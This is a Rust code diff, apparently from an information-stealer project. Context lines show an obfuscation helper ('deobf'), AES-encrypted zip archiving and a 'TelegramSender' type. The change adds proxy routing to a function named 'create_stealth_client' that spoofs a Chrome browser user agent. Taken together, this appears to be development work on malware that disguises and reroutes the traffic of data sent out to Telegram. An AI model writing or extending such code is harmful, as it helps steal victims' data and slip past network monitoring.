@@ -1,5 +1,6 @@
 use crate::formatter::{FormattedMessage, MessageFormatter};
 use crate::recovery::helpers::obfuscation::deobf;
+use crate::recovery::settings::RecoveryControl;
 use reqwest::{
     Client,
     header::{HeaderMap, HeaderValue, USER_AGENT},
@@ -10,6 +11,7 @@ use std::env;
 use std::io::{Cursor, Write};
 use std::time::{SystemTime, UNIX_EPOCH};
 use thiserror::Error;
+use tracing::warn;
 use zip::AesMode;
 use zip::CompressionMethod;
 use zip::write::{SimpleFileOptions, ZipWriter};
@@ -82,10 +84,20 @@ fn create_stealth_client() -> Client {
         HeaderValue::from_static("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
     );
 
-    Client::builder()
-        .default_headers(headers)
-        .build()
-        .unwrap_or_else(|_| Client::new())
+    let mut builder = Client::builder().default_headers(headers);
+
+    if let Some(proxy_url) = &RecoveryControl::global().proxy_server {
+        match reqwest::Proxy::all(proxy_url) {
+            Ok(proxy) => {
+                builder = builder.proxy(proxy);
+            }
+            Err(e) => {
+                warn!("failed to configure proxy '{}': {}", proxy_url, e);
+            }
+        }
+    }
+
+    builder.build().unwrap_or_else(|_| Client::new())
 }
 
 impl TelegramSender {
